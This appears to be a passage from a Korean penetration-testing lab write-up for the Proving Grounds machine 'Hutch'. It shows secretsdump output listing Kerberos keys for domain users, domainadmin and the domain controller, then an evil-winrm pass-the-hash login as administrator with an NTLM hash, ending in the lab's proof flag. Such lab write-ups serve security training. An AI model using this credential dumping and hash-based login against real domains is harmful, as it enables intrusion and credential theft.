hutch.offsec\rplacidi:des-cbc-md5:980189853220f8a2
hutch.offsec\opatry:aes256-cts-hmac-sha1-96:f87867606af1558ed27996123d2d6393f0330626befe65647e8c179471f0c534
hutch.offsec\opatry:aes128-cts-hmac-sha1-96:c41a8a599028f21664c2bae013b29ecb
hutch.offsec\opatry:des-cbc-md5:f7e51cf1f29145ce
hutch.offsec\ltaunton:aes256-cts-hmac-sha1-96:b5cd286fd8c9666c1e3c4f712cdb1e26b5fd51ac2104dc760d8a7f34fb617e99
hutch.offsec\ltaunton:aes128-cts-hmac-sha1-96:1a43ab7395e1f22ccb879a16f3a1496a
hutch.offsec\ltaunton:des-cbc-md5:7cf1a70145b55d2a
hutch.offsec\acostello:aes256-cts-hmac-sha1-96:34a6712ba826709bfdf7a02e2481f06beff30b1b6f6951daed8f446ec34f8422
hutch.offsec\acostello:aes128-cts-hmac-sha1-96:be0dee1e08c5474b11855f7d06d3a278
hutch.offsec\acostello:des-cbc-md5:3df49e3ed0736bd3
hutch.offsec\jsparwell:aes256-cts-hmac-sha1-96:b4d7e452c10a4555a20fab086aaa36e0fa7cb8d5a8b23df97bddad63f96b6f1d
hutch.offsec\jsparwell:aes128-cts-hmac-sha1-96:f20475c4781be65c52870e18cb4b613c
hutch.offsec\jsparwell:des-cbc-md5:54982c2a51dcefe6
hutch.offsec\oknee:aes256-cts-hmac-sha1-96:6b9a4ba95463961e9d2dcb8b17da7aa350e4d482e33fc81cca053ca333824c47
hutch.offsec\oknee:aes128-cts-hmac-sha1-96:aefb6cafd75fcfaa2fd38a0e56c75eec
hutch.offsec\oknee:des-cbc-md5:ec7a25eae0e94f1c
hutch.offsec\jmckendry:aes256-cts-hmac-sha1-96:22ee68dab0d877d43ee2f138bebbf30707b1c42f79f3753c42d7839116bd8b30
hutch.offsec\jmckendry:aes128-cts-hmac-sha1-96:bef6b24600ce768f636f0a6937da0418
hutch.offsec\jmckendry:des-cbc-md5:58dc1a49f4a45ba4
hutch.offsec\avictoria:aes256-cts-hmac-sha1-96:44d8f8cbc4517741a4f96dabe7ca8ef63d4772a43d79b838e00db7d9cd9963b9
hutch.offsec\avictoria:aes128-cts-hmac-sha1-96:fecfaa6ee425efb4c0fd5c1ab92a444f
hutch.offsec\avictoria:des-cbc-md5:837f9461e5b0fb49
hutch.offsec\jfrarey:aes256-cts-hmac-sha1-96:d0c59d53e3b2fa543b8fa148d7f9f5a8e1c41b5380e23a117ecbbe8ab138f8e5
hutch.offsec\jfrarey:aes128-cts-hmac-sha1-96:7017ee9e695a4c82f2b890e16414abe0
hutch.offsec\jfrarey:des-cbc-md5:df161cf8fddac145
hutch.offsec\eaburrow:aes256-cts-hmac-sha1-96:7c20426d91c8cfa2c0f301bd09dc570c4b7d485c9143db3e7da15644295e327c
hutch.offsec\eaburrow:aes128-cts-hmac-sha1-96:08d33ff5aa4a66054fe4333180b886ba
hutch.offsec\eaburrow:des-cbc-md5:4ca20797cd94b5ad
hutch.offsec\cluddy:aes256-cts-hmac-sha1-96:9f8ccb9ba6b0c8aa8199e300122478d4526be75d67ecc96fdc5e4892f9fd9432
hutch.offsec\cluddy:aes128-cts-hmac-sha1-96:0813d6e021a6117cf35ee8a6c4bda70b
hutch.offsec\cluddy:des-cbc-md5:8a322f1ff404ad89
hutch.offsec\agitthouse:aes256-cts-hmac-sha1-96:ea5768347ddf42e949c4c61c821e1b01be47d4a53485b7a6d8fca9b708a6a5dc
hutch.offsec\agitthouse:aes128-cts-hmac-sha1-96:0887271ba1239c9755738a7ce13345ff
hutch.offsec\agitthouse:des-cbc-md5:3ba23b07ef6d3d7a
hutch.offsec\fmcsorley:aes256-cts-hmac-sha1-96:679828b1625b953fb96470e0712f3bfa7866ee99f260f289dff48a19cd80cc87
hutch.offsec\fmcsorley:aes128-cts-hmac-sha1-96:d12b8c1d7125196020760b917cc5d159
hutch.offsec\fmcsorley:des-cbc-md5:7a9b7cc4496104ab
hutch.offsec\domainadmin:aes256-cts-hmac-sha1-96:8d90904d735e652112c1947fdde2f0b1205d8df1944c286b1d24ec1187dae4aa
hutch.offsec\domainadmin:aes128-cts-hmac-sha1-96:29e412c68977461a3f4ead34c2886402
hutch.offsec\domainadmin:des-cbc-md5:bc10f7df49315dc7
HUTCHDC$:aes256-cts-hmac-sha1-96:0c50a3c466970c9fb64b81a96f8b236e024650685332ee5a91ffc6e08d4a3da4
HUTCHDC$:aes128-cts-hmac-sha1-96:72d1943c93ea55ef1b876e505332ab64
HUTCHDC$:des-cbc-md5:d3497f981fb5d367
[*] Cleaning up... 
[*] Stopping service RemoteRegistry
[-] SCMR SessionError: code: 0x41b - ERROR_DEPENDENT_SERVICES_RUNNING - A stop control has been sent to a service that other running services are dependent on.
[*] Cleaning up... 
[*] Stopping service RemoteRegistry
Exception ignored in: <function Registry.__del__ at 0x7feb0598e5c0>
Traceback (most recent call last):
  File "/usr/lib/python3/dist-packages/impacket/winregistry.py", line 185, in __del__
  File "/usr/lib/python3/dist-packages/impacket/winregistry.py", line 182, in close
  File "/usr/lib/python3/dist-packages/impacket/examples/secretsdump.py", line 360, in close
  File "/usr/lib/python3/dist-packages/impacket/smbconnection.py", line 605, in closeFile
  File "/usr/lib/python3/dist-packages/impacket/smb3.py", line 1357, in close
  File "/usr/lib/python3/dist-packages/impacket/smb3.py", line 474, in sendSMB
  File "/usr/lib/python3/dist-packages/impacket/smb3.py", line 443, in signSMB
  File "/usr/lib/python3/dist-packages/impacket/crypto.py", line 150, in AES_CMAC
  File "/usr/lib/python3/dist-packages/Cryptodome/Cipher/AES.py", line 228, in new
KeyError: 'Cryptodome.Cipher.AES'
Exception ignored in: <function Registry.__del__ at 0x7feb0598e5c0>
Traceback (most recent call last):
  File "/usr/lib/python3/dist-packages/impacket/winregistry.py", line 185, in __del__
  File "/usr/lib/python3/dist-packages/impacket/winregistry.py", line 182, in close
  File "/usr/lib/python3/dist-packages/impacket/examples/secretsdump.py", line 360, in close
  File "/usr/lib/python3/dist-packages/impacket/smbconnection.py", line 605, in closeFile
  File "/usr/lib/python3/dist-packages/impacket/smb3.py", line 1357, in close
  File "/usr/lib/python3/dist-packages/impacket/smb3.py", line 474, in sendSMB
  File "/usr/lib/python3/dist-packages/impacket/smb3.py", line 443, in signSMB
  File "/usr/lib/python3/dist-packages/impacket/crypto.py", line 150, in AES_CMAC
  File "/usr/lib/python3/dist-packages/Cryptodome/Cipher/AES.py", line 228, in new
KeyError: 'Cryptodome.Cipher.AES'

```
![[Pasted image 20260515145041.png]]

administrator 접근 후 flag획득

```bash
┌──(kali㉿kali)-[~/PG/Hutch]
└─$ evil-winrm -i 192.168.216.122 -u administrator -H d1722dc7b059af8df626c88ee2d279e4
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc'' for module Reline                                                                                                                        
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> cd ..
*Evil-WinRM* PS C:\Users\Administrator> dir


    Directory: C:\Users\Administrator


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-r---        11/3/2020   9:04 PM                3D Objects
d-r---        11/3/2020   9:04 PM                Contacts
d-r---        11/8/2020   5:32 PM                Desktop
d-r---        11/3/2020   9:04 PM                Documents
d-r---        11/3/2020   9:04 PM                Downloads
d-r---        11/3/2020   9:04 PM                Favorites
d-r---        11/3/2020   9:04 PM                Links
d-r---        11/3/2020   9:04 PM                Music
d-r---        11/3/2020   9:04 PM                Pictures
d-r---        11/3/2020   9:04 PM                Saved Games
d-r---        11/3/2020   9:04 PM                Searches
d-r---        11/3/2020   9:04 PM                Videos


*Evil-WinRM* PS C:\Users\Administrator> cd Desktop
*Evil-WinRM* PS C:\Users\Administrator\Desktop> dir


    Directory: C:\Users\Administrator\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        5/14/2026   6:40 PM             34 proof.txt


*Evil-WinRM* PS C:\Users\Administrator\Desktop> type proof.txt
14fb84ee9468eda117d59d5c6d378774
*Evil-WinRM* PS C:\Users\Administrator\Desktop> ipconfig

Windows IP Configuration


Ethernet adapter Ethernet0:

   Connection-specific DNS Suffix  . :
   Link-local IPv6 Address . . . . . : fe80::2ce0:eb4:6eab:6f2e%3
   IPv4 Address. . . . . . . . . . . : 192.168.216.122
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : 192.168.216.254

```

![[Pasted image 20260515145246.png]]
